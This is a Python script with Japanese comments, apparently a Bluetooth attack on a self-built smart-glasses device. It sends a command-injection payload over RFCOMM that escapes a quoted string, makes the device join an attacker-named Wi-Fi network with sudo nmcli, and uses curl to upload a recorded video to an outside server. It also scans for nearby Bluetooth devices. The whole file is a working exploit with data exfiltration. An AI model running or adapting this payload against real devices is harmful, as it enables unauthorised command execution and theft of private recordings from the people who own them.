import bluetooth
import sys
import time

# 設定
TARGET_MAC = "E4:5F:01:F2:6D:21"  # スマートグラスのMACアドレス（要変更）
RFCOMM_CHANNEL = 1
MOVIE_PATH = "/home/matsumoto/bt_attack/Selfmade_smartglass/Recording_app/Videos/video_20251125-214914.h264"  # スマートグラス内の画像パス（要変更）
SERVER_IP = "192.168.4.1"
SERVER_PORT = 8000
SSID = "matsumoto_AP_danger"

# ペイロード生成
def generate_payload(movie_path, server_ip, server_port, ssid):
    """攻撃ペイロードの生成"""
    payload = (
        f'"; '
        f'sudo nmcli device wifi connect "{ssid}" && '
        f'sleep 7 && '
        f'curl -s -m 10 -F "file=@{movie_path}" http://{server_ip}:{server_port}/upload; '
        f'echo "'
    )
    return payload

def send_payload(target_mac, channel, payload):
    """Bluetooth経由でペイロードを送信"""
    print("=" * 60)
    print("Bluetooth攻撃ペイロード送信プログラム")
    print("=" * 60)
    print(f"ターゲットMAC: {target_mac}")
    print(f"RFCOMMチャネル: {channel}")
    print(f"ペイロード長: {len(payload)} 文字")
    print("-" * 60)
    print(f"ペイロード内容:\n{payload}")
    print("-" * 60)
    
    try:
        # RFCOMMソケットの作成
        print("\n[1] Bluetoothソケットを作成中...")
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        
        # デバイスに接続
        print(f"[2] {target_mac} に接続中...")
        sock.connect((target_mac, channel))
        print("[SUCCESS] 接続しました")
        
        # ペイロード送信
        print("[3] ペイロードを送信中...")
        sock.send(payload.encode('utf-8'))
        print("[SUCCESS] 送信完了")
        
        # 少し待機
        time.sleep(1)
        
        # 接続クローズ
        print("[4] 接続をクローズ中...")
        sock.close()
        print("[SUCCESS] クローズ完了")
        
        print("\n" + "=" * 60)
        print("攻撃ペイロードの送信が完了しました")
        print("スマートグラス側で以下の動作が実行されます:")
        print(f"  1. Wi-Fi '{SSID}' に接続")
        print(f"  2. 7秒待機（DHCP取得）")
        print(f"  3. 画像を {server_ip}:{server_port} にアップロード")
        print("=" * 60)
        
        return True
        
    except bluetooth.btcommon.BluetoothError as e:
        print(f"\n[ERROR] Bluetoothエラー: {e}")
        print("確認事項:")
        print("  - ターゲットデバイスの電源が入っているか")
        print("  - MACアドレスが正しいか")
        print("  - ペアリングが必要な場合は事前にペアリング済みか")
        return False
    except Exception as e:
        print(f"\n[ERROR] 予期しないエラー: {e}")
        return False

def main():
    """メイン処理"""
    print("\n")
    
    # MACアドレスの確認
    if TARGET_MAC == "AA:BB:CC:DD:EE:FF":
        print("[WARNING] MACアドレスがデフォルトのままです")
        print("スクリプト内の TARGET_MAC を実際のMACアドレスに変更してください")
        print("\n近くのBluetoothデバイスをスキャンしますか? (y/n): ", end="")
        
        response = input().strip().lower()
        if response == 'y':
            print("\nBluetoothデバイスをスキャン中...")
            nearby_devices = bluetooth.discover_devices(lookup_names=True)
            
            if nearby_devices:
                print(f"\n発見されたデバイス ({len(nearby_devices)}個):")
                for addr, name in nearby_devices:
                    print(f"  {addr} - {name}")
            else:
                print("デバイスが見つかりませんでした")
            
            print("\n")
            return
    
    # ペイロード生成
    payload = generate_payload(MOVIE_PATH, SERVER_IP, SERVER_PORT, SSID)
    
    # 確認プロンプト
    print("このペイロードを送信しますか? (y/n): ", end="")
    response = input().strip().lower()
    
    if response != 'y':
        print("キャンセルしました")
        return
    
    # 送信実行
    success = send_payload(TARGET_MAC, RFCOMM_CHANNEL, payload)
    
    if success:
        print("\n画像受信サーバー (image_receiver.py) のログを確認してください")
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n中断されました")
        sys.exit(1)